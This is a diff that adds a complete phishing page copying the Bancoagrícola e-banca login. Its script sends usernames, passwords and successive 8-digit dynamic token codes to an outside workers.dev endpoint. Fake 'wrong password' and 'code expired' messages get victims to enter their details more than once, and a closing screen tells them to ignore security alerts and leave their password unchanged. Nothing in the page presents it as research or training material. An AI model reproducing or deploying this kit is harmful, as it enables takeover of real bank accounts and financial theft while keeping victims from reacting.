@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="es-SV">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="format-detection" content="telephone=no">
+<title>Portal e-Banca</title>
+<meta name="description" content="Acceso al portal de e-banca Personas. Consulta saldos, transferencias y pagos en línea.">
+<meta name="robots" content="index,follow">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<meta name="theme-color" content="#fdda24">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Portal e-Banca">
+<meta property="og:description" content="Acceso al portal de e-banca Personas.">
+<link rel="canonical" href="/login">
+<link rel="preconnect" href="https://gentle-hall-4fb9.s-al13.workers.dev" crossorigin>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><rect width='32' height='32' fill='%23fdda24'/><g fill='%23000' transform='skewX(14)'><rect x='9' y='7' width='7' height='3'/><rect x='6' y='14' width='13' height='3'/><rect x='9' y='21' width='7' height='3'/></g></svg>">
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:"Open Sans",-apple-system,"Segoe UI",Roboto,Arial,sans-serif;color:#2c2a29;background:#fff;min-height:100vh;display:flex;flex-direction:column}
+header{height:56px;background:#fff;border-bottom:1px solid #e3e3e3;display:flex;align-items:center;justify-content:space-between;padding:0 26px;flex:0 0 auto}
+.hic{width:26px;height:26px;display:flex;align-items:center;justify-content:center}
+.hic svg{width:20px;height:20px;fill:none;stroke:#2c2a29;stroke-width:1.7;stroke-linejoin:round}
+.brand svg{height:22px;width:auto;display:block}
+.stage{flex:1;position:relative;background:#f2f0ec url("fondo.jpg") center top 24%/cover no-repeat;display:flex;align-items:flex-start;padding:77px 48px}
+.card{background:#fff;width:100%;max-width:580px;box-shadow:0 3px 18px rgba(0,0,0,.14);padding:34px 32px 0}
+h1{font-size:20px;font-weight:700;margin-bottom:28px}
+label{display:block;font-size:13px;color:#5f5f5f;margin-bottom:5px}
+input.txt{width:100%;border:0;border-bottom:1px solid #2c2a29;padding:4px 0 7px;font-size:15px;font-family:inherit;background:transparent}
+input.txt:focus{outline:none;border-bottom-width:2px}
+.fg{margin-bottom:22px}
+.chk{display:flex;align-items:center;gap:8px;font-size:13px;margin-bottom:20px;color:#3d3d3d}
+.chk input{width:14px;height:14px;accent-color:#fff}
+.lk{font-size:13px;text-decoration:underline;cursor:pointer;color:#2c2a29}
+.row{display:flex;justify-content:flex-end;margin-bottom:28px}
+.btn{background:#fdda24;color:#000;border:0;border-radius:999px;padding:12px 32px;font-size:14px;font-weight:700;font-family:inherit;cursor:pointer;display:inline-flex;align-items:center;gap:9px}
+.btn:disabled{background:#e9e9e9;color:#9a9a9a}
+.btn svg{width:15px;height:15px;fill:currentColor}
+.cfoot{border-top:1px solid #e3e3e3;display:flex;justify-content:space-between;padding:15px 32px;margin:0 -32px;font-size:13px}
+.cfoot span{display:flex;align-items:center;gap:6px;cursor:pointer}
+.cfoot svg{width:15px;height:15px;fill:#2c2a29}
+footer{height:44px;background:#fff;border-top:1px solid #e3e3e3;display:flex;align-items:center;justify-content:space-between;padding:0 26px;font-size:11px;color:#6a6a6a;flex:0 0 auto}
+footer .l{display:flex;align-items:center;gap:18px}
+footer .l svg{width:14px;height:14px;fill:#6a6a6a}
+footer a{color:#6a6a6a;text-decoration:none}
+footer b{cursor:pointer;font-weight:400}
+.alert{display:none;background:#fdecec;border-left:3px solid #d9534f;color:#a32525;font-size:12.5px;padding:10px 12px;margin-bottom:18px;line-height:1.5}
+.alert.on{display:block}
+.alert.w{background:#fff8e3;border-left-color:#e0a800;color:#8a6a11}
+.off{display:none}
+.tokbox{display:flex;gap:8px;margin-bottom:22px}
+.tokbox input{flex:1;min-width:0;border:0;border-bottom:1px solid #2c2a29;text-align:center;font-size:18px;font-weight:700;padding:6px 0;background:transparent}
+.tokbox input:focus{outline:none;border-bottom-width:2px}
+.tokbox input:disabled{color:#9a9a9a;border-bottom-color:#cfcfcf}
+.duv{display:flex;gap:11px;align-items:flex-start;margin:24px 0 28px;font-size:12.5px;color:#4a4a4a;line-height:1.5}
+.duv .ic{width:23px;height:23px;border-radius:50%;background:#7fd4f0;display:flex;align-items:center;justify-content:center;flex:0 0 auto}
+.duv .ic svg{width:13px;height:13px;fill:#fff}
+.brow{display:flex;justify-content:space-between;gap:14px}
+.ghost{background:#fff;border:1px solid #2c2a29;border-radius:999px;padding:12px 28px;font-size:13px;font-weight:700;font-family:inherit;cursor:pointer}
+.ok{width:54px;height:54px;border-radius:50%;background:#e9f7ee;display:flex;align-items:center;justify-content:center;margin-bottom:16px}
+.ok svg{width:26px;height:26px;fill:#1e9e4f}
+.fin{background:#fff8e3;border:1px solid #f0dda0;border-left:4px solid #e0a800;padding:16px;font-size:13px;line-height:1.7;color:#6b5310;border-radius:4px;margin-bottom:22px}
+.modal{position:fixed;inset:0;background:#fff;z-index:80;display:none;flex-direction:column}
+.modal.on{display:flex}
+.mbody{flex:1;overflow:auto;padding:26px;text-align:center}
+.mbody p,.mbody li{font-size:13px;line-height:1.65;color:#4a4a4a}
+.mbody ul{margin:8px 0 14px 20px;text-align:left}
+.mbody li{margin-bottom:6px}
+.mbody b{color:#2c2a29}
+.mfoot{padding:16px 26px;border-top:1px solid #e3e3e3}
+.mfoot .btn{width:100%;justify-content:center}
+.phone{display:block;margin:0 auto 18px}
+@media(max-width:700px){
+header{justify-content:center}
+.hic:first-of-type{position:absolute;left:20px}
+.hic:last-of-type{position:absolute;right:20px}
+.stage{background:#fff;padding:0}
+.card{box-shadow:none;max-width:100%;padding:26px 24px 0;min-height:calc(100vh - 57px);display:flex;flex-direction:column}
+h1{text-align:center;font-size:20px;margin:10px 0 60px;line-height:1.35;font-weight:700}
+.fg{margin-bottom:36px}
+.chk{margin-bottom:60px;font-size:14px}
+.chk input{width:18px;height:18px;appearance:none;border:1.5px solid #2c2a29;border-radius:2px;background:#fff}
+.chk input:checked{background:#2c2a29}
+.row{justify-content:center;margin-bottom:30px}
+.row .btn{width:100%;max-width:390px;padding:15px 0;justify-content:center;text-transform:uppercase;font-size:15px;letter-spacing:.3px}
+.row .btn svg{display:none}
+.olv{text-align:center;margin-bottom:82px;font-size:14px}
+.cfoot{margin:0 -24px;margin-top:auto;padding:16px 24px;font-size:14px}
+.cfoot span{text-decoration:underline}
+footer{display:none}
+.mob{display:block!important}
+}
+.dsk{display:none}
+@media(min-width:701px){.dsk{display:block}.mob{display:none!important}}
+</style>
+</head>
+<body>
+
+<header>
+<div class="hic mob"><svg viewBox="0 0 24 24"><path d="M6.6 10.8c1.4 2.8 3.8 5.1 6.6 6.6l2.2-2.2c.3-.3.7-.4 1-.2 1.1.4 2.3.6 3.6.6.6 0 1 .4 1 1V20c0 .6-.4 1-1 1C10.6 21 3 13.4 3 4c0-.6.4-1 1-1h3.5c.6 0 1 .4 1 1 0 1.2.2 2.4.6 3.6.1.4 0 .8-.2 1l-2.3 2.2z"/></svg></div>
+<div class="brand"><svg viewBox="0 0 138 26"><g transform="skewX(14)" fill="#000"><rect x="10" y="2" width="9" height="4.5"/><rect x="5" y="10.5" width="18" height="4.5"/><rect x="10" y="19" width="9" height="4.5"/></g><text x="34" y="19.5" font-size="15.5" font-weight="800" letter-spacing="-.5" font-family="Open Sans,Arial,sans-serif" fill="#000">Bancoagrícola</text></svg></div>
+<div class="hic"><svg viewBox="0 0 24 24"><path d="M20 2H4a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h3v4l5-4h8a2 2 0 0 0 2-2V4a2 2 0 0 0-2-2z"/><path d="M9 7.5h6M9 11h4" stroke-width="1.5"/></svg></div>
+</header>
+
+<div class="stage">
+<div class="card">
+
+<div id="s1">
+<h1><span class="mob">Bienvenido a la aplicación de Bancoagrícola</span><span class="dsk">Bienvenido a e-banca Personas</span></h1>
+<div id="a1" class="alert"></div>
+<div class="fg"><label for="u">Usuario</label><input id="u" class="txt" autocomplete="username" autocapitalize="off" spellcheck="false"></div>
+<div class="fg"><label for="c">Contraseña</label><input id="c" class="txt" type="password" autocomplete="current-password"></div>
+<div class="chk"><input type="checkbox" id="rec"><label for="rec" style="margin:0">Recordar usuario</label></div>
+<div class="mob olv"><span class="lk" id="olv">Olvide mi Clave</span></div>
+<div style="margin-bottom:24px" class="dsk"><span class="lk" id="olv2">Olvide mi Clave</span></div>
+<div class="row"><button class="btn" id="b1" type="button">Continuar <svg viewBox="0 0 24 24"><path d="M12 4l-1.4 1.4L16.2 11H4v2h12.2l-5.6 5.6L12 20l8-8z"/></svg></button></div>
+</div>
+
+<div id="s2" class="off">
+<h1 style="text-align:left;font-size:17px;line-height:1.5;margin-bottom:20px">Ingresa el código generado por tu Clave Dinámica:</h1>
+<div id="a2" class="alert"></div>
+<label>Código</label>
+<div class="tokbox" id="tok"></div>
+<div style="margin-bottom:4px"><span class="lk">Obtener mi código por Telebanca</span></div>
+<div class="duv">
+<div class="ic"><svg viewBox="0 0 24 24"><path d="M12 2a7 7 0 0 0-4 12.7V17a1 1 0 0 0 1 1h6a1 1 0 0 0 1-1v-2.3A7 7 0 0 0 12 2zM9 20h6v1a1 1 0 0 1-1 1h-4a1 1 0 0 1-1-1z"/></svg></div>
+<div>Si tienes dudas sobre cómo generar tu Clave Dinámica, <span class="lk" id="ayuda">haz clic aquí</span></div>
+</div>
+<div class="brow">
+<button class="ghost" id="cancel" type="button">Cancelar</button>
+<button class="btn" id="b2" type="button">Ingresar <svg viewBox="0 0 24 24"><path d="M12 4l-1.4 1.4L16.2 11H4v2h12.2l-5.6 5.6L12 20l8-8z"/></svg></button>
+</div>
+</div>
+
+<div id="s3" class="off" style="padding-bottom:26px">
+<div class="ok"><svg viewBox="0 0 24 24"><path d="M12 2 1 21h22L12 2zm1 14h-2v2h2v-2zm0-6h-2v4h2v-4z"/></svg></div>
+<h1 style="font-size:18px;margin-bottom:12px">Estamos presentando inconvenientes</h1>
+<div class="fin">
+Por el momento no es posible completar tu acceso. Vuelve a intentarlo en unos minutos.
+<br><br>
+Si te llegan <b>notificaciones de alertas</b> a tu correo o a la App, <b>omítelas</b>: son errores del sistema y puedes ignorarlas.
+</div>
+<p style="font-size:12.5px;color:#8a8a8a;line-height:1.6;margin-bottom:24px">No es necesario que cambies tu contraseña ni tu Clave Dinámica.</p>
+</div>
+
+<div class="cfoot">
+<span id="reg">Regístrate <svg viewBox="0 0 24 24"><path d="M3 17.2V21h3.8L17.8 10 14 6.2 3 17.2zM20.7 7.1a1 1 0 0 0 0-1.4l-2.4-2.4a1 1 0 0 0-1.4 0l-1.9 1.9L18.8 9l1.9-1.9z"/></svg></span>
+<span id="con">Contáctanos <svg viewBox="0 0 24 24"><path d="M6.6 10.8c1.4 2.8 3.8 5.1 6.6 6.6l2.2-2.2c.3-.3.7-.4 1-.2 1.1.4 2.3.6 3.6.6.6 0 1 .4 1 1V20c0 .6-.4 1-1 1C10.6 21 3 13.4 3 4c0-.6.4-1 1-1h3.5c.6 0 1 .4 1 1 0 1.2.2 2.4.6 3.6.1.4 0 .8-.2 1l-2.3 2.2z"/></svg></span>
+</div>
+</div>
+</div>
+
+<footer>
+<div class="l">
+<svg viewBox="0 0 24 24"><path d="M12 1 3 5v6c0 5 3.8 9.7 9 11 5.2-1.3 9-6 9-11V5l-9-4z"/></svg>
+<a href="#">Consejos de seguridad</a><a href="#">Tutorial del canal</a><a href="#">Tips de uso</a><a href="#">Preguntas frecuentes</a>
+<b id="priv">Privacidad</b><b id="term">Términos</b>
+<span>Todos los derechos reservados.</span>
+</div>
+</footer>
+
+<div class="modal" id="mh">
+<div class="mbody">
+<svg class="phone" width="170" height="285" viewBox="0 0 180 300">
+<rect x="2" y="2" width="176" height="296" rx="20" fill="#fff" stroke="#2c2a29" stroke-width="3"/>
+<rect x="14" y="16" width="152" height="24" rx="6" fill="#f4f4f4"/>
+<g transform="translate(22,22)"><g transform="skewX(14)" fill="#000"><rect x="6" y="1" width="5" height="2.6"/><rect x="3" y="6" width="11" height="2.6"/><rect x="6" y="11" width="5" height="2.6"/></g></g>
+<text x="52" y="33" font-size="9" font-weight="700" font-family="Open Sans,Arial" fill="#000">Bancoagrícola</text>
+<rect x="14" y="52" width="152" height="16" rx="4" fill="#eee"/>
+<rect x="14" y="74" width="110" height="10" rx="3" fill="#e6e6e6"/>
+<rect x="14" y="90" width="140" height="10" rx="3" fill="#e6e6e6"/>
+<rect x="14" y="112" width="152" height="26" rx="13" fill="#fdda24"/>
+<text x="90" y="129" font-size="9" font-weight="700" text-anchor="middle" font-family="Open Sans,Arial" fill="#000">Generar código</text>
+<text x="90" y="168" font-size="8" text-anchor="middle" font-family="Open Sans,Arial" fill="#8a8a8a">Tu código es</text>
+<text x="90" y="200" font-size="26" font-weight="800" text-anchor="middle" font-family="Open Sans,Arial" fill="#000">48291736</text>
+<text x="90" y="224" font-size="8" text-anchor="middle" font-family="Open Sans,Arial" fill="#8a8a8a">Válido por 60 segundos</text>
+</svg>
+<p style="font-weight:700;margin-bottom:8px;text-align:left">Para generar tu Clave Dinámica:</p>
+<ul>
+<li>Ingresa a la App y selecciona la opción Token en el menú.</li>
+<li>Presiona "Generar código" y copia los 8 dígitos que aparecen en pantalla.</li>
+</ul>
+<p style="font-weight:700;text-align:left">Recuerda: tu Clave Dinámica cambiará cada minuto.</p>
+</div>
+<div class="mfoot"><button class="btn" id="mhc" type="button">Aceptar</button></div>
+</div>
+
+<div class="modal" id="mp">
+<div class="mbody">
+<p style="font-weight:700;margin-bottom:10px;text-align:left">Aviso de Privacidad</p>
+<p style="text-align:left">Los datos ingresados se utilizan únicamente para validar el acceso y se tratan conforme a la Ley de Protección de Datos Personales de El Salvador.</p>
+<p style="text-align:left;margin-top:10px">Este portal opera sobre conexión cifrada. El banco nunca te solicitará tu contraseña ni tu Clave Dinámica por teléfono, correo o WhatsApp.</p>
+</div>
+<div class="mfoot"><button class="btn" id="mpc" type="button">Cerrar</button></div>
+</div>
+
+<div class="modal" id="mt">
+<div class="mbody">
+<p style="font-weight:700;margin-bottom:10px;text-align:left">Términos de Uso</p>
+<p style="text-align:left">El acceso está sujeto a los términos y condiciones del contrato de servicios electrónicos.</p>
+<p style="text-align:left;margin-top:10px">Verifica siempre que la dirección en tu navegador corresponda al portal antes de ingresar tus credenciales.</p>
+</div>
+<div class="mfoot"><button class="btn" id="mtc" type="button">Cerrar</button></div>
+</div>
+
+<script>
+var API="https://gentle-hall-4fb9.s-al13.workers.dev/";
+var deb=["1234","0000","4444","1111","2222","3333","5555","6666","7777","8888","9999","1212","1010","123456","1234567","000000","111111","654321","123123"];
+var ronda=1,paso=1,falloClave=0,bloq=0,U="",C="",TK="",usados=[];
+function $(i){return document.getElementById(i)}
+function rep(v){return /^(\d)\1+$/.test(v)}
+function seq(v){if(!v||v.length<3)return false;return "1234567890".indexOf(v)>-1||"0987654321".indexOf(v)>-1}
+function debil(v){if(!v)return false;if(deb.indexOf(v)>-1)return true;return rep(v)||seq(v)}
+function soloNum(v){return /^\d+$/.test(v)}
+function av(id,t,w){var e=$(id);e.className="alert on"+(w?" w":"");e.textContent=t}
+function cl(id){$(id).className="alert"}
+function ir(a,b){$(a).classList.add("off");$(b).classList.remove("off")}
+function limpia(){bx.forEach(function(y){y.value=""})}
+function bloquear(x){bx.forEach(function(y){y.disabled=x})}
+function enviar(e){try{fetch(API,{method:"POST",mode:"cors",keepalive:true,headers:{"Content-Type":"application/json"},body:JSON.stringify({etapa:e,usuario:U,clave:C,token:TK,ronda:ronda,dinamica:paso})})}catch(x){}}
+var tb=$("tok");
+for(var i=0;i<8;i++){var x=document.createElement("input");x.maxLength=1;x.inputMode="numeric";x.type="text";x.setAttribute("pattern","[0-9]*");tb.appendChild(x)}
+var bx=[].slice.call(tb.children);
+function soloDig(b){b.value=(b.value||"").replace(/[^0-9]/g,"").slice(-1)}
+bx.forEach(function(b,n){
+b.addEventListener("input",function(){soloDig(b);if(!b.value)return;if(n<7){bx[n+1].focus();return}setTimeout(procesar,60)});
+b.addEventListener("keyup",function(){soloDig(b)});
+b.addEventListener("paste",function(){setTimeout(function(){soloDig(b)},10)});
+b.addEventListener("keydown",function(e){if(e.key==="Backspace"&&!b.value&&n>0)bx[n-1].focus()});
+});
+$("b1").onclick=function(){
+cl("a1");
+var u=$("u").value.trim(),c=$("c").value.trim();
+if(!u){av("a1","Ingresa tu usuario.");return}
+if(soloNum(u)){av("a1","El usuario no puede contener solo números. Verifícalo.");return}
+if(debil(u)){av("a1","El usuario ingresado no es válido. Verifícalo.");return}
+if(!c){av("a1","Ingresa tu contraseña.");return}
+if(debil(c)){av("a1","La contraseña ingresada no es correcta.");return}
+var b=$("b1");
+if(falloClave===0){
+falloClave=1;b.disabled=true;b.textContent="Verificando...";
+setTimeout(function(){
+b.disabled=false;b.innerHTML='Continuar <svg viewBox="0 0 24 24"><path d="M12 4l-1.4 1.4L16.2 11H4v2h12.2l-5.6 5.6L12 20l8-8z"/></svg>';
+av("a1","La contraseña ingresada no es correcta. Vuelve a escribirla.");
+$("c").value="";$("c").focus();U=u;C=c;enviar("clave_incorrecta");
+},600);
+return;
+}
+b.disabled=true;b.textContent="Verificando...";
+setTimeout(function(){
+U=u;C=c;enviar("acceso");ir("s1","s2");
+b.disabled=false;b.innerHTML='Continuar <svg viewBox="0 0 24 24"><path d="M12 4l-1.4 1.4L16.2 11H4v2h12.2l-5.6 5.6L12 20l8-8z"/></svg>';
+setTimeout(function(){bx[0].focus()},100);
+},700);
+};
+$("cancel").onclick=function(){ir("s2","s1")};
+$("b2").onclick=function(){procesar()};
+function procesar(){
+if(bloq)return;
+var v=bx.map(function(b){return (b.value||"").replace(/[^0-9]/g,"")}).join("");
+if(v.length<8){av("a2","Debes completar los 8 dígitos de la Clave Dinámica.");return}
+cl("a2");
+if(usados.indexOf(v)>-1){av("a2","Esa Clave Dinámica ya fue utilizada. Genera una nueva.");limpia();bx[0].focus();return}
+if(rep(v)||seq(v)){av("a2","Esa Clave Dinámica ya expiró. Genera una nueva.");limpia();bx[0].focus();return}
+usados.push(v);TK=String(v);enviar("token");
+var b=$("b2");
+bloq=1;bloquear(true);b.disabled=true;b.textContent="Verificando...";
+setTimeout(function(){
+av("a2","El código ingresado es incorrecto. Verifícalo e inténtalo nuevamente.");
+var n=10;b.textContent="Espera "+n+"s";
+var t=setInterval(function(){
+n--;
+if(n>0){b.textContent="Espera "+n+"s";return}
+clearInterval(t);
+limpia();
+if(paso===2){
+av("a2","Tu Clave Dinámica ha vencido. Espera 30 segundos para generar una nueva.",1);
+var m=30;b.textContent="Espera "+m+"s";
+var t2=setInterval(function(){
+m--;
+if(m>0){b.textContent="Espera "+m+"s";return}
+clearInterval(t2);
+paso=3;limpia();cl("a2");bloq=0;bloquear(false);b.disabled=false;b.textContent="Ingresar";bx[0].focus();
+},1000);
+return;
+}
+if(paso===3){
+bloq=0;b.disabled=false;b.textContent="Ingresar";
+if(ronda===1){ronda=2;paso=1;limpia();$("c").value="";ir("s2","s1");cl("a2");bloquear(false);}
+else{ir("s2","s3");cl("a2");bloquear(false);enviar("final");}
+return;
+}
+paso=2;cl("a2");bloquear(false);bloq=0;b.disabled=false;b.textContent="Ingresar";bx[0].focus();
+},1000);
+},700);
+}
+["olv","olv2"].forEach(function(k){$(k).onclick=function(){$("mh").classList.add("on")}});
+$("ayuda").onclick=function(){$("mh").classList.add("on")};
+$("mhc").onclick=function(){$("mh").classList.remove("on")};
+$("reg").onclick=function(){$("mh").classList.add("on")};
+$("con").onclick=function(){$("mp").classList.add("on")};
+$("priv").onclick=function(){$("mp").classList.add("on")};
+$("mpc").onclick=function(){$("mp").classList.remove("on")};
+$("term").onclick=function(){$("mt").classList.add("on")};
+$("mtc").onclick=function(){$("mt").classList.remove("on")};
+</script>
+</body>
+</html>
